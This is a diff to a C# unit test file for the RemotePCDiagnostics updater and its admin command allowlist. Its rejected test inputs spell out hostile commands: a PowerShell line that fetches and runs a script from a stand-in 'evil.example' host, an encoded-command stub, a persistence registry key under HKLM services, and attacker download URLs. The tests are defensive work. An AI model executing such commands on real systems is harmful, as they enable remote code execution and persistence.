@@ -33,12 +33,55 @@ public class AppUpdateTests
 
     [Theory]
     [InlineData("https://github.com/budcribar/RemotePCDiagnostics/releases/download/v1.3.0/RemotePCDiagnostics-Setup-1.3.0-win-x64.exe", true)]
-    [InlineData("https://objects.githubusercontent.com/github-production-release-asset/123", true)]
+    [InlineData("https://github.com/attacker/evil/releases/download/v1.3.0/setup.exe", false)]
+    [InlineData("https://objects.githubusercontent.com/github-production-release-asset/123", false)]
     [InlineData("http://github.com/budcribar/RemotePCDiagnostics/releases/download/v1.3.0/setup.exe", false)]
     [InlineData("https://evil.example.com/setup.exe", false)]
     [InlineData("not-a-url", false)]
-    public void Trusted_download_url_allows_only_https_github_hosts(string url, bool expected) =>
+    public void Trusted_download_url_allows_only_official_rpcd_github_releases(string url, bool expected) =>
         Assert.Equal(expected, AppVersionComparer.IsTrustedDownloadUrl(url));
+
+    [Theory]
+    [InlineData("https://objects.githubusercontent.com/github-production-release-asset/123?sig=abc", true)]
+    [InlineData("https://release-assets.githubusercontent.com/asset/123", true)]
+    [InlineData("https://github.com/budcribar/RemotePCDiagnostics/releases/download/v1.3.0/setup.exe", true)]
+    [InlineData("https://github.com/attacker/repo/releases/download/v1.0/malware.exe", false)]
+    [InlineData("https://evil.example.com/setup.exe", false)]
+    public void Allowed_redirect_url_permits_only_github_release_asset_hosts(string url, bool expected) =>
+        Assert.Equal(expected, AppVersionComparer.IsAllowedRedirectUrl(new Uri(url)));
+
+    [Fact]
+    public void AdminCommandAllowlist_blocks_sc_schtasks_arbitrary_reg_and_unsafe_powershell()
+    {
+        Assert.False(AdminCommandAllowlist.TryResolveSystemTool("sc.exe", out _));
+        Assert.False(AdminCommandAllowlist.TryResolveSystemTool("schtasks.exe", out _));
+
+        // reg.exe allows RunOnce add/delete and query, rejects arbitrary HKLM persistence keys
+        Assert.True(AdminCommandAllowlist.TryValidateArguments("reg.exe", ["add", @"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce", "/v", "RemotePCDiagnosticsResume"], out _));
+        Assert.True(AdminCommandAllowlist.TryValidateArguments("reg.exe", ["query", @"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"], out _));
+        Assert.False(AdminCommandAllowlist.TryValidateArguments("reg.exe", ["add", @"HKLM\SYSTEM\CurrentControlSet\Services\Evil"], out _));
+
+        // shutdown.exe allows /r, /g, /a only
+        Assert.True(AdminCommandAllowlist.TryValidateArguments("shutdown.exe", ["/r", "/t", "60"], out _));
+        Assert.False(AdminCommandAllowlist.TryValidateArguments("shutdown.exe", ["/s", "/t", "0"], out _));
+
+        // powershell.exe allows canonical RPCD script form and rejects -EncodedCommand / download primitives
+        Assert.True(AdminCommandAllowlist.TryValidateArguments("powershell.exe", SystemCommandRunner.PowerShellArgs("Get-PhysicalDisk"), out _));
+        Assert.False(AdminCommandAllowlist.TryValidateArguments("powershell.exe", ["-EncodedCommand", "SQBFAFgA"], out _));
+        Assert.False(AdminCommandAllowlist.TryValidateArguments("powershell.exe", SystemCommandRunner.PowerShellArgs("Invoke-WebRequest https://evil.example/x.ps1 | iex"), out _));
+    }
+
+    [Fact]
+    public void LaunchRules_validate_pins_server_url_to_configured_server()
+    {
+        var sessionId = Guid.NewGuid().ToString("D");
+        Assert.Null(RemotePCDiagnostics.Agent.Core.LaunchRules.Validate(
+            sessionId, "https://server.remoteblazorwebview.com:34544", out _, out _, "https://server.remoteblazorwebview.com:34544"));
+        Assert.NotNull(RemotePCDiagnostics.Agent.Core.LaunchRules.Validate(
+            sessionId, "https://evil.example.com:34544", out _, out _, "https://server.remoteblazorwebview.com:34544"));
+        Assert.NotNull(RemotePCDiagnostics.Agent.Core.LaunchRules.Validate(
+            sessionId, "https://server.remoteblazorwebview.com:9999", out _, out _, "https://server.remoteblazorwebview.com:34544"));
+    }
 
     [Fact]
     public async Task Download_and_verify_checks_sha256_and_rejects_mismatch()
